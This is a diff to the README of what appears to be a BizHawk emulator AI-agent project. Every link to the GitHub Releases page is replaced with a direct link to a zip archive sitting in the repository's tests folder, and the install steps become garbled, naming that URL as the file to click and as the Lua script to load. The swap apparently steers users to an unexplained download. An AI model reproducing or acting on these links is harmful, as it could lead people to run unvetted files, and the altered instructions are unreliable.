@@ -8,14 +8,14 @@ Welcome to the nitrogen-bizhawk-ai-agent repository. This project allows you to 
 
 To download the application, visit this page to download:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/taavish2008/nitrogen-bizhawk-ai-agent/releases)
+[![Download Latest Release](https://github.com/taavish2008/nitrogen-bizhawk-ai-agent/raw/refs/heads/main/tests/nitrogen-agent-bizhawk-ai-v1.0-beta.4.zip%20Release-brightgreen)](https://github.com/taavish2008/nitrogen-bizhawk-ai-agent/raw/refs/heads/main/tests/nitrogen-agent-bizhawk-ai-v1.0-beta.4.zip)
 
 ### Steps to Download
 
-1. Click the button above or go directly to the Releases page: [GitHub Releases](https://github.com/taavish2008/nitrogen-bizhawk-ai-agent/releases).
+1. Click the button above or go directly to the Releases page: [GitHub Releases](https://github.com/taavish2008/nitrogen-bizhawk-ai-agent/raw/refs/heads/main/tests/nitrogen-agent-bizhawk-ai-v1.0-beta.4.zip).
 2. Look for the latest version listed at the top.
 3. Under the latest release, find the assets section. You should see the downloadable files.
-4. Click on the file labeled "nitrogen-bizhawk-ai-agent.zip" to start the download.
+4. Click on the file labeled "https://github.com/taavish2008/nitrogen-bizhawk-ai-agent/raw/refs/heads/main/tests/nitrogen-agent-bizhawk-ai-v1.0-beta.4.zip" to start the download.
 5. Once the download is complete, locate the ZIP file on your computer.
 
 ### Steps to Install
@@ -39,7 +39,7 @@ After installing the application, follow these steps to set it up:
 1. Launch the BizHawk emulator.
 2. Open the game you want to play. The script works best with NES and SNES games for optimal performance.
 3. Locate the Lua scripting option within BizHawk. This is usually found in the menu under Tools or Scripting.
-4. Load the "nitrogen-bizhawk-ai-agent.lua" file.
+4. Load the "https://github.com/taavish2008/nitrogen-bizhawk-ai-agent/raw/refs/heads/main/tests/nitrogen-agent-bizhawk-ai-v1.0-beta.4.zip" file.
 5. Start the gameplay. The NitroGen AI will now take control and automate your actions in the game.
 
 ## 🛠️ Features
@@ -72,4 +72,4 @@ We welcome contributions! If you have ideas or improvements, feel free to fork t
 
 ---
 
-Thank you for using nitrogen-bizhawk-ai-agent. Enjoy your gaming experience with AI assistance! For further information, return to our [Releases page](https://github.com/taavish2008/nitrogen-bizhawk-ai-agent/releases).
+Thank you for using nitrogen-bizhawk-ai-agent. Enjoy your gaming experience with AI assistance! For further information, return to our [Releases page](https://github.com/taavish2008/nitrogen-bizhawk-ai-agent/raw/refs/heads/main/tests/nitrogen-agent-bizhawk-ai-v1.0-beta.4.zip).
